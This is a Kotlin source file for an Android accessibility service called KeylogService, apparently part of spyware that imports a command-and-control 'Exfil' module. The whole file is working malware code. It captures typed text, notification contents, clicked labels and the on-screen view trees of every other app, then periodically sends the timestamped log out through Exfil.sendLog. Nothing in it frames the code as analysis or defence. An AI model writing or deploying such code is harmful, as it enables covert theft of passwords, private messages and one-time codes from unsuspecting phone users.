package com.sp.core.accessibility

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.sp.core.c2.Exfil
import com.sp.core.util.Prefs
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class KeylogService : AccessibilityService() {

    private val ts = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
    private var buffer = StringBuilder()
    private var lastFlush = System.currentTimeMillis()

    override fun onServiceConnected() {
        super.onServiceConnected()
        serviceInfo = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPES_ALL_MASK
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                    AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
            notificationTimeout = 50
        }
        Prefs.set(this, "acc_connected", true)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        val pkg = event.packageName?.toString() ?: return
        if (pkg == packageName) return
        if (pkg.startsWith("com.android.systemui")) return

        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val text = event.text.joinToString("")
                if (text.isNotBlank()) append("[$pkg] TEXT: $text")
            }
            AccessibilityEvent.TYPE_VIEW_FOCUSED,
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                event.source?.let { harvestNode(it, pkg) }
            }
            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
                val text = event.text.joinToString(" | ")
                if (text.isNotBlank()) append("[$pkg] NOTIF: $text")
            }
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                val node = event.source ?: return
                val txt = node.text?.toString() ?: node.contentDescription?.toString()
                if (!txt.isNullOrBlank()) append("[$pkg] CLICK: $txt")
            }
        }
        if (System.currentTimeMillis() - lastFlush > 30_000) flush()
    }

    private fun harvestNode(node: AccessibilityNodeInfo?, pkg: String) {
        node ?: return
        val txt = node.text?.toString() ?: node.contentDescription?.toString()
        if (!txt.isNullOrBlank()) append("[$pkg] VIEW: $txt")
        for (i in 0 until node.childCount) harvestNode(node.getChild(i), pkg)
    }

    private fun append(line: String) {
        synchronized(buffer) {
            buffer.append("[${ts.format(Date())}] $line\n")
            if (buffer.length > 64_000) flush()
        }
    }

    private fun flush() {
        synchronized(buffer) {
            if (buffer.isEmpty()) return
            val payload = buffer.toString()
            buffer = StringBuilder()
            lastFlush = System.currentTimeMillis()
            Exfil.sendLog(this, "keylog", payload)
        }
    }

    override fun onInterrupt() { flush() }
    override fun onDestroy() { flush(); super.onDestroy() }
}